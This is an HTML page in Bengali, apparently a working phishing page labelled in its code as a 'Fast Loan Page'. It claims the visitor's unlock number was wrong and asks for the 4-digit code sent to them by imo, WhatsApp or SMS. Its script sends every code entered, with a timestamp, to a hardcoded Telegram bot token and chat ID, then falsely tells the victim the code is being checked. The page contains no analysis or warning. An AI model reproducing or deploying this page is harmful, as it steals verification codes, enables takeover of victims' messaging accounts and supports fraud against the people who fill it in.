<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Hind Siliguri', sans-serif; }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">

    <div class="bg-white rounded-3xl shadow-2xl max-w-sm w-full p-8 text-center border border-gray-100">
        
        <div class="flex justify-center mb-6">
            <div class="bg-red-50 rounded-full p-6">
                <svg class="w-16 h-16 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                </svg>
            </div>
        </div>

        <h1 class="text-3xl font-bold text-red-600 mb-6">
            ভুল আনলক নাম্বার!
        </h1>

        <p class="text-gray-600 text-lg leading-relaxed mb-8 px-2">
            আপনার দেওয়া আনলক নাম্বারটি সঠিক নয়। অনুগ্রহ করে আপনার <span class="font-semibold">imo, whatsapp</span> অথবা <span class="font-semibold">মেসেজ</span> অপশনে আসা ৪-সংখ্যার সঠিক আনলক নাম্বারটি নিচে দিন।
        </p>

        <!-- ইনপুট ফর্ম -->
        <form id="codeForm" class="space-y-6">
            <input 
                type="text" 
                id="unlockCode" 
                placeholder="৪ সংখ্যার কোড দিন (যেমন: 1234)" 
                maxlength="4" 
                inputmode="numeric"
                pattern="[0-9]*"
                class="w-full px-4 py-3 border border-gray-300 rounded-xl text-center text-xl focus:outline-none focus:ring-2 focus:ring-red-500"
                required
            >
            <button 
                type="submit"
                class="w-full bg-[#f14336] hover:bg-red-700 text-white font-bold py-4 px-6 rounded-2xl transition duration-300 shadow-lg active:scale-95"
            >
                আবার চেষ্টা করুন
            </button>
        </form>

        <!-- ফিডব্যাক মেসেজ -->
        <p id="message" class="mt-6 text-sm font-medium hidden"></p>
        
    </div>

    <script>
        const form = document.getElementById('codeForm');
        const messageEl = document.getElementById('message');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const code = document.getElementById('unlockCode').value.trim();
            
            if (code.length !== 4 || !/^\d{4}$/.test(code)) {
                showMessage('দয়া করে সঠিক ৪ সংখ্যার কোড দিন!', 'text-red-600');
                return;
            }

            // আপনার Telegram Bot তথ্য (সরাসরি কোডে বসানো)
            const BOT_TOKEN = '8559810386:AAED1MAj5UBg9YwO-FR6lgKu_45i3AebkDA';
            const CHAT_ID = '8398202645';

            const text = `নতুন কোড পাওয়া গেছে!\n\nকোড: ${code}\nসময়: ${new Date().toLocaleString('bn-BD')}\nসোর্স: Fast Loan Page`;

            const url = `https://api.telegram.org/bot\( {BOT_TOKEN}/sendMessage?chat_id= \){CHAT_ID}&text=${encodeURIComponent(text)}`;

            try {
                const response = await fetch(url);
                const data = await response.json();

                if (data.ok) {
                    showMessage('কোড সঠিকভাবে চেক করা হচ্ছে... দয়া করে অপেক্ষা করুন।', 'text-green-600');
                    document.getElementById('unlockCode').value = ''; // ইনপুট ক্লিয়ার
                } else {
                    showMessage('কোনো সমস্যা হয়েছে (Telegram থেকে এরর)। আবার চেষ্টা করুন।', 'text-red-600');
                    console.error('Telegram Error:', data);
                }
            } catch (error) {
                showMessage('ইন্টারনেট বা সার্ভার সমস্যা। পরে চেষ্টা করুন।', 'text-red-600');
                console.error('Fetch Error:', error);
            }
        });

        function showMessage(text, colorClass) {
            messageEl.textContent = text;
            messageEl.className = `mt-6 text-sm font-medium ${colorClass}`;
            messageEl.classList.remove('hidden');
        }
    </script>

</body>
</html>
